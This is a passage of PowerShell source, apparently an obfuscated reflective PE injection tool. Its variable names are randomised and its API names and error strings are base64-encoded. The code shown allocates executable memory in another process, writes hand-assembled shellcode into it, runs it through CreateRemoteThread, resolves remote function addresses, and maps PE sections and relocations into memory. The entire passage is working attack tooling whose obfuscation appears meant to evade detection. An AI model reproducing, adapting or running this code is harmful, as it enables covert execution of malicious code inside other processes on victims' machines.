			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
			Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${fc7940d945ef45cebf72bc11f48ed9c4} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
			${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${fc7940d945ef45cebf72bc11f48ed9c4}.Length)
			${92a04d86d9784071a611d48fc87b87c3} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, [UIntPtr][UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE)
			if (${92a04d86d9784071a611d48fc87b87c3} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WriteProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${92a04d86d9784071a611d48fc87b87c3}, ${4c46ae8af4724383abfdb3ea89625a14}, [UIntPtr][UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}, [Ref]$NumBytesWritten)
			if ((${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${7136749d9ce64f46ae0440186d4f6c1c} = Invoke-CreateRemoteThread -d5e70cc477d14906a24cf0452a1000e4 ${bc96a39c79d24a35b88ba52e143fe2a2} -dfccdc8a8c7748d3bab1a84f860772a5 ${92a04d86d9784071a611d48fc87b87c3} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9}
			${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WaitForSingleObject.Invoke(${7136749d9ce64f46ae0440186d4f6c1c}, 20000)
			if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${acafad3a2a75412893cf40bcdc32329b})
			${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.ReadProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${41da3e2357f34b9fbc673df90d645d59}, $ReturnValMem, [UIntPtr][UInt64]${acafad3a2a75412893cf40bcdc32329b}, [Ref]$NumBytesWritten)
			if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${41da3e2357f34b9fbc673df90d645d59}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
			${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${92a04d86d9784071a611d48fc87b87c3}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${7136749d9ce64f46ae0440186d4f6c1c} = Invoke-CreateRemoteThread -d5e70cc477d14906a24cf0452a1000e4 ${bc96a39c79d24a35b88ba52e143fe2a2} -dfccdc8a8c7748d3bab1a84f860772a5 ${0ff4fbfed554441e87b4602e4367edec} -bd568ae9e5b646148eec42947ae9f165 ${0b4d34d2fdbd4d7b9e317c39f815e031} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9}
			${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WaitForSingleObject.Invoke(${7136749d9ce64f46ae0440186d4f6c1c}, 20000)
			if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]$ExitCode = 0
			${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetExitCodeThread.Invoke(${7136749d9ce64f46ae0440186d4f6c1c}, [Ref]$ExitCode)
			if ((${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq 0) -or ($ExitCode -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${0b4d34d2fdbd4d7b9e317c39f815e031}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
		return $DllAddress
	}
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${bc96a39c79d24a35b88ba52e143fe2a2},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${c7282ff644f94f67bef33d3a1829650d},
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		${ef958cd51d3144759d0cfc0a4b45bd60}
		)
		${acafad3a2a75412893cf40bcdc32329b} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${1cf8137414214140a84a5e27c19241bd} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${ef958cd51d3144759d0cfc0a4b45bd60})
		${666f8d8480e442e88e82c8b6bd1bb80c} = [UIntPtr][UInt64]([UInt64]${ef958cd51d3144759d0cfc0a4b45bd60}.Length + 1)
		${eb87a025817f4ba1913208c714ae1229} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, ${666f8d8480e442e88e82c8b6bd1bb80c}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE)
		if (${eb87a025817f4ba1913208c714ae1229} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WriteProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${eb87a025817f4ba1913208c714ae1229}, ${1cf8137414214140a84a5e27c19241bd}, ${666f8d8480e442e88e82c8b6bd1bb80c}, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${1cf8137414214140a84a5e27c19241bd})
		if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${666f8d8480e442e88e82c8b6bd1bb80c} -ne $NumBytesWritten)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${7e8c5e022873429894a5b4a7f0911dca} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${0fefc8d04834473691863168d298ecea} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke(${7e8c5e022873429894a5b4a7f0911dca}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${0091c8dd57144a8293223b9d32206820} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, [UInt64][UInt64]${acafad3a2a75412893cf40bcdc32329b}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE)
		if (${0091c8dd57144a8293223b9d32206820} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]$GetProcAddressSC = @()
		if (${c8edec2d3caf433f9746e28faa91f6ff}.PE64Bit -eq $true)
		{
			${4ec64358adac448090a84a9353187a08} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${22249080ac7e441e8052452242d9afcd} = @(0x48, 0xba)
			${b72826eeaf2b44269d68144203ed0ab3} = @(0x48, 0xb8)
			${b5d0766c86af4164b9cc481c99405e69} = @(0xff, 0xd0, 0x48, 0xb9)
			${66424b61376941d494d661203711880b} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${4ec64358adac448090a84a9353187a08} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${22249080ac7e441e8052452242d9afcd} = @(0xb9)
			${b72826eeaf2b44269d68144203ed0ab3} = @(0x51, 0x50, 0xb8)
			${b5d0766c86af4164b9cc481c99405e69} = @(0xff, 0xd0, 0xb9)
			${66424b61376941d494d661203711880b} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${4af5a9f574b6494298ae9f4ee83f56b7} = ${4ec64358adac448090a84a9353187a08}.Length + ${22249080ac7e441e8052452242d9afcd}.Length + ${b72826eeaf2b44269d68144203ed0ab3}.Length + ${b5d0766c86af4164b9cc481c99405e69}.Length + ${66424b61376941d494d661203711880b}.Length + (${acafad3a2a75412893cf40bcdc32329b} * 4)
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${4af5a9f574b6494298ae9f4ee83f56b7})
		${4c46ae8af4724383abfdb3ea89625a14} = ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${4ec64358adac448090a84a9353187a08} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${4ec64358adac448090a84a9353187a08}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${c7282ff644f94f67bef33d3a1829650d}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${22249080ac7e441e8052452242d9afcd} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${22249080ac7e441e8052452242d9afcd}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${eb87a025817f4ba1913208c714ae1229}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${b72826eeaf2b44269d68144203ed0ab3} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${b72826eeaf2b44269d68144203ed0ab3}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${0fefc8d04834473691863168d298ecea}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${b5d0766c86af4164b9cc481c99405e69} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${b5d0766c86af4164b9cc481c99405e69}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${0091c8dd57144a8293223b9d32206820}, ${9b72a66f00a64c5cb5c47a7bf44c7b7b}, $false)
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${acafad3a2a75412893cf40bcdc32329b})
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 ${66424b61376941d494d661203711880b} -af6d51d057d949f4a6df10d4847caeef ${9b72a66f00a64c5cb5c47a7bf44c7b7b}
		${9b72a66f00a64c5cb5c47a7bf44c7b7b} = Add-SignedIntAsUnsigned ${9b72a66f00a64c5cb5c47a7bf44c7b7b} (${66424b61376941d494d661203711880b}.Length)
		${92a04d86d9784071a611d48fc87b87c3} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualAllocEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, [IntPtr]::Zero, [UIntPtr][UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_COMMIT -bor ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RESERVE, ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE)
		if (${92a04d86d9784071a611d48fc87b87c3} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WriteProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${92a04d86d9784071a611d48fc87b87c3}, ${4c46ae8af4724383abfdb3ea89625a14}, [UIntPtr][UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}, [Ref]$NumBytesWritten)
		if ((${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]${4af5a9f574b6494298ae9f4ee83f56b7}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${7136749d9ce64f46ae0440186d4f6c1c} = Invoke-CreateRemoteThread -d5e70cc477d14906a24cf0452a1000e4 ${bc96a39c79d24a35b88ba52e143fe2a2} -dfccdc8a8c7748d3bab1a84f860772a5 ${92a04d86d9784071a611d48fc87b87c3} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9}
		${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.WaitForSingleObject.Invoke(${7136749d9ce64f46ae0440186d4f6c1c}, 20000)
		if (${94d54b9f2d6c4bfd9a1438bad15bbcc2} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${acafad3a2a75412893cf40bcdc32329b})
		${94d54b9f2d6c4bfd9a1438bad15bbcc2} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.ReadProcessMemory.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${0091c8dd57144a8293223b9d32206820}, $ReturnValMem, [UIntPtr][UInt64]${acafad3a2a75412893cf40bcdc32329b}, [Ref]$NumBytesWritten)
		if ((${94d54b9f2d6c4bfd9a1438bad15bbcc2} -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${92a04d86d9784071a611d48fc87b87c3}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${eb87a025817f4ba1913208c714ae1229}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFreeEx.Invoke(${bc96a39c79d24a35b88ba52e143fe2a2}, ${0091c8dd57144a8293223b9d32206820}, [UIntPtr][UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE) | Out-Null
		return $ProcAddress
	}
	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${dc16372125974a299ad4aa82bcfa6b2d},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${c8edec2d3caf433f9746e28faa91f6ff},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926}
		)
		for( ${4c7705bd7e4a4adbb1ff54055067af60} = 0; ${4c7705bd7e4a4adbb1ff54055067af60} -lt ${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${4c7705bd7e4a4adbb1ff54055067af60}++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.SectionHeaderPtr) (${4c7705bd7e4a4adbb1ff54055067af60} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_SECTION_HEADER)))
			${f05bb6e0c3734019996f1e5db89ecc6d} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualAddress))
			${fa83c32265d146e3961dae996938674e} = ${f05bb6e0c3734019996f1e5db89ecc6d}.SizeOfRawData
			if (${f05bb6e0c3734019996f1e5db89ecc6d}.PointerToRawData -eq 0)
			{
				${fa83c32265d146e3961dae996938674e} = 0
			}
			if (${fa83c32265d146e3961dae996938674e} -gt ${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualSize)
			{
				${fa83c32265d146e3961dae996938674e} = ${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualSize
			}
			if (${fa83c32265d146e3961dae996938674e} -gt 0)
			{
				Test-MemoryRangeValid -e39dbe60176b48af8d74a8a90f28e95a $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -dfccdc8a8c7748d3bab1a84f860772a5 $SectionDestAddr -d8b42bb3072b496db413a4756f1fa94d ${fa83c32265d146e3961dae996938674e} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${dc16372125974a299ad4aa82bcfa6b2d}, [Int32]${f05bb6e0c3734019996f1e5db89ecc6d}.PointerToRawData, $SectionDestAddr, ${fa83c32265d146e3961dae996938674e})
			}
			if (${f05bb6e0c3734019996f1e5db89ecc6d}.SizeOfRawData -lt ${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualSize)
			{
				${6d21ba8e5c994fe289fc3bdf2314bfb0} = ${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualSize - ${fa83c32265d146e3961dae996938674e}
				[IntPtr]${dfccdc8a8c7748d3bab1a84f860772a5} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]${fa83c32265d146e3961dae996938674e}))
				Test-MemoryRangeValid -e39dbe60176b48af8d74a8a90f28e95a $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -dfccdc8a8c7748d3bab1a84f860772a5 ${dfccdc8a8c7748d3bab1a84f860772a5} -d8b42bb3072b496db413a4756f1fa94d ${6d21ba8e5c994fe289fc3bdf2314bfb0} | Out-Null
				${a36b17e7e2e643b69f9b9e1a2bd60bb9}.memset.Invoke(${dfccdc8a8c7748d3bab1a84f860772a5}, 0, [IntPtr]${6d21ba8e5c994fe289fc3bdf2314bfb0}) | Out-Null
			}
		}
	}
	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${c8edec2d3caf433f9746e28faa91f6ff},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${ed5fe4ebfc354342a21d3474bca3b962},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926}
		)
		[Int64]${91b138c9599a4457b5b93a0ccde15822} = 0
		${c1db0633b0de40bfa5ea42a80c98f2ae} = $true 
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_BASE_RELOCATION)
		if ((${ed5fe4ebfc354342a21d3474bca3b962} -eq [Int64]${c8edec2d3caf433f9746e28faa91f6ff}.EffectivePEHandle) `
				-or (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt (${ed5fe4ebfc354342a21d3474bca3b962}) (${c8edec2d3caf433f9746e28faa91f6ff}.EffectivePEHandle)) -eq $true)
		{
			${91b138c9599a4457b5b93a0ccde15822} = Sub-SignedIntAsUnsigned (${ed5fe4ebfc354342a21d3474bca3b962}) (${c8edec2d3caf433f9746e28faa91f6ff}.EffectivePEHandle)
			${c1db0633b0de40bfa5ea42a80c98f2ae} = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt (${c8edec2d3caf433f9746e28faa91f6ff}.EffectivePEHandle) (${ed5fe4ebfc354342a21d3474bca3b962})) -eq $true)
		{
			${91b138c9599a4457b5b93a0ccde15822} = Sub-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.EffectivePEHandle) (${ed5fe4ebfc354342a21d3474bca3b962})
		}
		[IntPtr]${2984238c43d440bd9a9c419de9179cc1} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${445e2fbb1b844c4584498dd9a6f50596} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${2984238c43d440bd9a9c419de9179cc1}, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_BASE_RELOCATION)
			if (${445e2fbb1b844c4584498dd9a6f50596}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${445e2fbb1b844c4584498dd9a6f50596}.VirtualAddress))
